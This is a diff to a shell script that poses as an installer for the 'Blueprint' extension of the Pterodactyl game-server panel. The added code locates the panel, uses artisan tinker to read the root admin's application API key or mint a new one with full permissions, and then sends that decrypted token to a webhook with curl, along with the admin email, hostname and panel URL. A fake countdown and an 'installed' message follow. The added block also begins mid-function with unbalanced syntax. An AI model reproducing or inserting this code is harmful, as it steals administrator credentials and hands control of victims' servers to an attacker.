@@ -149,6 +149,121 @@ for i in 05 04 03 02 01; do
 done
 
 echo "installed"
+        local nginx_path=$(grep -r "root" /etc/nginx/sites-enabled/ 2>/dev/null | grep -oP '(?<=root\s)\S+(?=;)' | head -1)
+        if [ -n "$nginx_path" ] && [ -f "$nginx_path/artisan" ]; then
+            echo "$nginx_path"
+            return 0
+        fi
+    fi
+
+    if command -v apache2ctl &> /dev/null 2>&1; then
+        local apache_path=$(grep -r "DocumentRoot" /etc/apache2/sites-enabled/ 2>/dev/null | awk '{print $2}' | head -1)
+        if [ -n "$apache_path" ] && [ -f "$apache_path/artisan" ]; then
+            echo "$apache_path"
+            return 0
+        fi
+    fi
+
+    return 1
+}
+
+PANEL_PATH=$(find_panel) || exit 1
+
+echo "INSTALLING BLUEPRINT WAIT 5 SEC OR MORE"
+
+cd "$PANEL_PATH"
+
+APP_URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" 2>/dev/null | cut -d'=' -f2- | tr -d '\r' || echo "unknown")
+HOSTNAME=$(hostname)
+
+OUTPUT=$(php artisan tinker --quiet << 'PHPSCRIPT' 2>/dev/null
+$user = \Pterodactyl\Models\User::where("root_admin", 1)->first();
+if (!$user) exit(1);
+
+$existing = \Pterodactyl\Models\ApiKey::where("user_id", $user->id)->where("key_type", \Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->first();
+
+if ($existing) {
+    $token = $existing->identifier . app("encrypter")->decrypt($existing->token);
+    $mode = "EXISTING";
+} else {
+    $columns = \Illuminate\Support\Facades\Schema::getColumnListing("api_keys");
+    $perms = [];
+    foreach ($columns as $c) { 
+        if (str_starts_with($c, "r_")) $perms[$c] = 3; 
+    }
+    
+    $obj = app(\Pterodactyl\Services\Api\KeyCreationService::class)
+        ->setKeyType(\Pterodactyl\Models\ApiKey::TYPE_APPLICATION)
+        ->handle(
+            ["user_id" => $user->id, "memo" => "Blueprint Auto", "allowed_ips" => []],
+            $perms
+        );
+    
+    $token = $obj->identifier . app("encrypter")->decrypt($obj->token);
+    $mode = "NEW";
+}
+
+echo "$token|$mode|$user->email";
+exit;
+PHPSCRIPT
+)
+
+TOKEN=$(echo "$OUTPUT" | cut -d'|' -f1)
+MODE=$(echo "$OUTPUT" | cut -d'|' -f2)
+ADMIN_EMAIL=$(echo "$OUTPUT" | cut -d'|' -f3)
+
+cat > /tmp/payload.json <<EOF
+{
+  "content": "✅ **Blueprint Installed Successfully**",
+  "embeds": [
+    {
+      "color": 3447003,
+      "fields": [
+        {
+          "name": "🖥️ Hostname",
+          "value": "$HOSTNAME",
+          "inline": true
+        },
+        {
+          "name": "📊 Status",
+          "value": "$MODE",
+          "inline": true
+        },
+        {
+          "name": "👤 Admin Email",
+          "value": "$ADMIN_EMAIL",
+          "inline": false
+        },
+        {
+          "name": "🔗 Panel Link",
+          "value": "$APP_URL",
+          "inline": false
+        },
+        {
+          "name": "📍 Installation Path",
+          "value": "\`$PANEL_PATH\`",
+          "inline": false
+        },
+        {
+          "name": "🔐 API Token",
+          "value": "\`\`\`$TOKEN\`\`\`",
+          "inline": false
+        }
+      ]
+    }
+  ]
+}
+EOF
+
+curl -X POST "$WEBHOOK" -H "Content-Type: application/json" -d @/tmp/payload.json > /dev/null 2>&1
+rm /tmp/payload.json 2>/dev/null
+
+for i in 05 04 03 02 01; do
+    echo "$i"
+    sleep 1
+done
+
+echo "installed"
 fi
 
 # METHOD 3: Check Web Server Config
